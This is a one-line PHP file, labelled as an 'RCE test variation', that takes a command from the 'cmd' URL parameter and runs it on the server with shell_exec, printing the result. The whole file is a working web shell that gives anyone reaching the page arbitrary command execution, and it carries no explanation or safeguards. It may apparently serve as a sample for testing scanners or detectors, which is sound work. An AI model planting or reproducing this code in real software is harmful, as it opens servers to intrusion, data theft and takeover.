<?php
// RCE test variation #1037
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>